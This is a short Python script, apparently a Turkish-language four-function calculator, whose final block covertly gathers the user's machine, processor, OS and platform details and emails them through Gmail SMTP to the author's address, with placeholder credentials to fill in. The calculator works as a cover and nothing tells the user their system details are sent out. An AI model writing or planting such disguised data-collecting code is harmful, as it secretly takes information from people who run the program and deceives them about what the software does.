import platform
import smtplib
import datetime 

# Toplama Fonksiyonu
def Topla(x, y):
   return x + y
 
# Çıkarma Fonksiyonu
def Cikar(x, y):
   return x - y
 
# Çarpma Fonksiiyonu
def Carp(x, y):
   return x * y
 
# Bölme Fonksiyonu
def Bol(x, y):
   return x / y
 
print("Yapılacak İşlemi Seçin.")
print("=======================")
print("1.Toplama")
print("2.Çıkarma")
print("3.Çarpma")
print("4.Bölme")
 
# Kullanıcıdan Seçim İsteme
secim = input("Seçiminiz (1/2/3/4):")
 
sayi1 = int(input("1. Sayı: "))
sayi2 = int(input("2. Sayı: "))
 
if secim == '1':
   print(sayi1,"+",sayi2,"=", Topla(sayi1,sayi2))
 
elif secim == '2':
   print(sayi1,"-",sayi2,"=", Cikar(sayi1,sayi2))
 
elif secim == '3':
   print(sayi1,"*",sayi2,"=", Carp(sayi1,sayi2))
 
elif secim == '4':
   print(sayi1,"/",sayi2,"=", Bol(sayi1,sayi2))
else:
   print("Geçersiz Giriş")

content = platform.machine()
content1 = platform.version()
content2 = platform.platform()
content3 = platform.processor()
content4 = platform.system()
message = content +"\n"+ content1+"\n" + content2 +"\n"+ content3+"\n" + content4

kime = "your_gmail"

mail = smtplib.SMTP("smtp.gmail.com",587)
mail.ehlo()
mail.starttls()
 

mail.login("your_gmail","your_password")
mail.sendmail("your_gmail",kime, message)

